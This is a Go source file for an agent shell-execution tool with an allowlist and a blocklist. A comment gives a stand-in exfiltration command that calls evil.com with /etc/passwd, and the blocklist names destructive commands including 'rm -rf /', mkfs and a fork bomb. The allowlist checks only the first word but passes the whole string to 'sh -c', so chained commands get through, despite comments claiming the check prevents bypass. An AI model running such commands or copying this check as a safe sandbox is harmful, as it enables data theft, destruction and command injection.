package tools

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// ShellTool allows agents to execute shell commands on the host system.
// This tool is inherently dangerous and always requires human review.
// Only commands whose basename matches an entry in AllowedCommands are permitted.
// When AllowedCommands is empty (the default), ALL commands are denied — no bypass
// via prefix matching (e.g. "curl" must not match "curl http://...").
// For safety, start with an empty AllowedCommands list and add only specific commands.
//
// Input examples:
//
//	{"command": "ls -la /tmp"}
//	{"command": "echo hello", "timeout": 10}
//	{"command": "df -h"}
type ShellTool struct {
	BaseTool
	AllowedCommands []string      // Whitelist — when non-empty, ONLY these prefixes are permitted. Empty = DENY ALL.
	BlockedCommands []string      // Blacklist (defense-in-depth; not a primary boundary)
	DefaultTimeout  time.Duration // Default command timeout
	WorkingDir      string        // Default working directory
}

// NewShellTool creates a shell execution tool.
func NewShellTool(opts ...func(*ShellTool)) *ShellTool {
	t := &ShellTool{
		BaseTool: BaseTool{
			NameValue:        "ShellTool",
			DescriptionValue: "Execute shell commands. Input: {'command': 'string', 'timeout': seconds}.",
		},
		DefaultTimeout: 30 * time.Second,
	}

	t.BlockedCommands = []string{
		"rm -rf /", "mkfs", "dd if=/dev/zero", ":(){ :|:& };:",
		"shutdown", "reboot", "halt", "poweroff",
	}

	for _, opt := range opts {
		opt(t)
	}
	return t
}

// WithAllowedCommands restricts execution to only these command prefixes.
func WithAllowedCommands(cmds []string) func(*ShellTool) {
	return func(t *ShellTool) {
		t.AllowedCommands = cmds
	}
}

// WithShellTimeout sets the default timeout.
func WithShellTimeout(d time.Duration) func(*ShellTool) {
	return func(t *ShellTool) {
		t.DefaultTimeout = d
	}
}

// WithWorkingDir sets the default working directory.
func WithWorkingDir(dir string) func(*ShellTool) {
	return func(t *ShellTool) {
		t.WorkingDir = dir
	}
}

func (t *ShellTool) Execute(ctx context.Context, input map[string]interface{}) (string, error) {
	command, _ := input["command"].(string)
	if command == "" {
		return "", fmt.Errorf("'command' is required")
	}

	cmdLower := strings.ToLower(strings.TrimSpace(command))

	// Security: Check allowed commands whitelist
	// When AllowedCommands is non-empty, enforce a whitelist using exact
	// command matching (not prefix). This prevents bypass via e.g.
	// "curl http://evil.com/$(cat /etc/passwd)" when "curl" is allowed.
	// Prefix matching would allow "culrt" to pass if "curl" is whitelisted.
	// Exact matching requires the command word to match exactly.
	// When AllowedCommands is empty, DENY ALL commands (secure default).
	if len(t.AllowedCommands) > 0 {
		// Extract the first whitespace-delimited token as the command
		cmdTokens := strings.Fields(cmdLower)
		if len(cmdTokens) == 0 {
			return "", fmt.Errorf("empty command")
		}
		cmdWord := cmdTokens[0]
		// Resolve to absolute path if it contains a slash (e.g. /usr/bin/cat)
		if strings.Contains(cmdWord, "/") {
			// Allow absolute paths only if the basename matches an allowed command
			cmdWord = filepath.Base(cmdWord)
		}
		allowed := false
		for _, allowedCmd := range t.AllowedCommands {
			if strings.EqualFold(cmdWord, strings.ToLower(allowedCmd)) {
				allowed = true
				break
			}
		}
		if !allowed {
			return "", fmt.Errorf("command not in allowed list: %s (allowed: %v)", command, t.AllowedCommands)
		}
	} else {
		return "", fmt.Errorf("no allowed commands configured; set AllowedCommands to permit specific commands")
	}

	// Defense-in-depth: block dangerous patterns even when whitelisted.
	// This is NOT a primary security boundary (whitelist is), but adds a
	// second layer for common destructive patterns that may slip through
	// if a prefix like "rm" is allowed.
	if len(t.BlockedCommands) > 0 {
		for _, blocked := range t.BlockedCommands {
			if strings.Contains(cmdLower, strings.ToLower(blocked)) {
				return "", fmt.Errorf("command blocked for safety: contains '%s'", blocked)
			}
		}
	}

	// Parse timeout
	timeout := t.DefaultTimeout
	if ts, ok := input["timeout"].(float64); ok && ts > 0 {
		timeout = time.Duration(ts) * time.Second
	}

	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	// Build command
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", command)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", command)
	}

	if t.WorkingDir != "" {
		cmd.Dir = t.WorkingDir
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	var result strings.Builder
	if stdout.Len() > 0 {
		result.WriteString(stdout.String())
	}
	if stderr.Len() > 0 {
		if result.Len() > 0 {
			result.WriteString("\n--- STDERR ---\n")
		}
		result.WriteString(stderr.String())
	}

	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return result.String(), fmt.Errorf("command timed out after %v", timeout)
		}
		return result.String(), fmt.Errorf("command failed: %w\n%s", err, result.String())
	}

	// Truncate very long output
	output := result.String()
	if len(output) > 50000 {
		output = output[:50000] + "\n... [output truncated at 50KB]"
	}

	return output, nil
}

func (t *ShellTool) Name() string { return t.BaseTool.NameValue }
func (t *ShellTool) Description() string { return t.BaseTool.DescriptionValue }
